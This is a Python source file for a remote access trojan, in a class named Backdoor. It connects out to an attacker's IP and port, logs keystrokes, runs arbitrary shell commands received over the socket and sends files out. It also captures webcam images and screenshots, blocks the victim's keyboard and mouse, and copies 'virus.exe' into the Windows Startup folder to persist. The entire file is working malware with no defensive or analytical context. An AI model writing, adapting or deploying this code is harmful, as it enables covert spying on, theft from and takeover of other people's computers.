import socket, json, subprocess, os, cv2, pyautogui
import base64, threading, time, webbrowser
import keyboard

pyautogui.FAILSAFE = False


def writer(data):
    with open("logs.txt","a") as file:
        file.write(data)


def filter(char):
	if char == "space":
		return " "
	elif len(char) > 1:
		return "[%s]" % char
	else:
		return char


def logger(event):
	writer(filter(event.name))


def UkDecode(text):
	text = text.decode("cp866")
	for i in range(len(text) - 1):
		if text[i] == "?":
			text = text[:i] + "і" + text[i+1:]
	return text


class Backdoor:

	def __init__(self, ip, port):
		self.ip = ip
		self.port = port

		self.connected = False
		self.connection = None

		self.cursor_blocking = False

		keyboard.on_press(logger)
		keylogger = threading.Thread(target=keyboard.wait)
		keylogger.start()

	
	def block_cursor(self):
		while self.cursor_blocking:
			pyautogui.moveTo(0, 0)

	
	def connect(self):
		while True:
			if not self.connected:
				print("try connect")
				try:
					self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					self.connection.connect((self.ip, self.port))
					self.connected = True
					print("[+] Connected")
				except:
					pass
			time.sleep(3)


	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())


	def reliable_recive(self):
		json_data = ""
		while True:
			try:
				json_data += self.connection.recv(1024).decode()
				return json.loads(json_data)
			except: continue


	def write_file(self, path, content):
		content = base64.b64decode(content)
		with open(path, "wb") as file:
			file.write(content)
			self.reliable_send(f"[+] File uploaded as {path}")


	def read_file(self, path):
		file = open(path, "rb").read()
		file = base64.encodebytes(file).decode()
		return file


	def execute_system_command(self, command):
		try:
			res = UkDecode(subprocess.check_output(command, shell = True))
			return res
		except:
			return "[-] Check your command"


	def change_working_directory_to(self, path):
		try:
			os.chdir(path)
			return "[+] Changing working directory to " + path
		except:
			return f"[-] No such file or directory: '{path}'"


	def set_autorun_self(self):
		username = os.getlogin()
		startup_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
		command = f'copy "virus.exe" "{startup_path}\\try.py"'
		print(command)
		os.system(command)


	def run(self):
		self.set_autorun_self()
		while True:
			if self.connected:
				command = self.reliable_recive()
				if command == "exit":
					self.reliable_send("Exiting...")
					self.connected = False

				elif command.split()[0] == "cd":
					path = command.replace("cd", "").strip()
					res = self.change_working_directory_to(path)
					self.reliable_send(res)

				elif command == "camera":
					try:
						cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
						result, image = cam.read()
						cv2.imwrite("camera.jpg", image)
						self.reliable_send(self.read_file("camera.jpg") )
						os.remove("camera.jpg")
						cam.release()
					except:
						self.reliable_send("[-] Can't connect to any camera")

				elif command == "screen":
					try:
						screenshot = pyautogui.screenshot()
						filename = "scr.png"
						screenshot.save(filename)
						file = self.read_file(filename)
						self.reliable_send(file)
					except:
						self.reliable_send("[-] Can't take screenshot")


				elif command.split()[0] == "download":
					file = command.replace("download", "").strip()
					if os.path.exists(file):
						self.reliable_send(self.read_file(file))
					else:
						self.reliable_send("[-] Check your command")

				elif command.split()[0] == "upload":
					command = command.replace("upload", "").strip()
					file = command
					file_name = ""
					for i in command:
						if i == ",":
							file = file[2:]
							break
						file_name += i
						file = file[1:]
					self.write_file(file_name, file)
				
				elif command.split()[0] == "keyboard":
					if command.split()[1] == "false":
						for i in range(150):
							keyboard.block_key(i)
						self.reliable_send("[+] Keyboard disconnected")
					elif command.split()[1] == "true":
						for i in range(150):
							keyboard.unblock_key(i)
						self.reliable_send("[+] Keyboard connected")
					else:
						self.reliable_send("[-] Can't understand your command")

				elif command.split()[0] == "mouse":
					if command.split()[1] == "false":
						self.cursor_blocking = True
						block_cursor_thread = threading.Thread(target=self.block_cursor)
						block_cursor_thread.start()
						self.reliable_send("[+] Mouse disconnected")
					elif command.split()[1] == "true":
						self.cursor_blocking = False
						self.reliable_send("[+] Mouse connected")
					else:
						self.reliable_send("[-] Can't understand your command")

				elif command == "get keys":
					keys = self.read_file("logs.txt")
					self.reliable_send(keys)

				else:
					res = self.execute_system_command(command)
					self.reliable_send(res)



if __name__ == "__main__":
	from config import IP, PORT
	backdoor = Backdoor(IP, PORT)

	backdoor_thread = threading.Thread(target=backdoor.connect)
	backdoor_thread.start()

	backdoor.run()
